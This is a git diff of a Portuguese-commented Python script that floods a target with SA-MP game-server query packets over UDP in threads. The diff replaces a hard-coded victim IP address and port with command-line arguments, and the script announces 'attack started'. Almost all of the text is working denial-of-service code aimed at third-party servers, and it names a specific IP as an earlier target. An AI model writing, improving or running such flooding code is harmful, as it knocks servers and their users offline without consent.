@@ -1,14 +1,17 @@
 import socket
 import struct
-import codecs
+import codecs,sys
 import threading
 import random
 import time
 import os
 
-ip = "89.46.1.130"
-port = 7000
-orgip = ip
+
+
+
+ip = sys.argv[1]
+port = sys.argv[2]
+orgip =ip
 
 Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        codecs.decode("53414d509538e1a9611e63","hex_codec"),#c
@@ -23,7 +26,13 @@ Pacotes = [codecs.decode("53414d5090d91d4d611e700a465b00","hex_codec"),#p
                        ]
 
 
-print("Ataque iniciado no ip: %s e Porta: %s"%(orgip, port))
+print("Ataque iniciado no ip: %s e Porta: %s"%(orgip,port))
+
+            
+
+
+
+
 
 class MyThread(threading.Thread):
      def run(self):
@@ -31,9 +40,10 @@ class MyThread(threading.Thread):
                 sock = socket.socket(
                     socket.AF_INET, socket.SOCK_DGRAM) # Internet and UDP
                 
-                msg = Pacotes[random.randrange(0, 3)]
+                msg = Pacotes[random.randrange(0,3)]
                      
                 sock.sendto(msg, (ip, int(port)))
+                
                 
                 if(int(port) == 7777):
                     sock.sendto(Pacotes[5], (ip, int(port)))
@@ -45,6 +55,7 @@ class MyThread(threading.Thread):
                     sock.sendto(Pacotes[7], (ip, int(port)))
                 elif(int(port) == 1111):
                     sock.sendto(Pacotes[9], (ip, int(port)))    
+                
 
 if __name__ == '__main__':
     try:
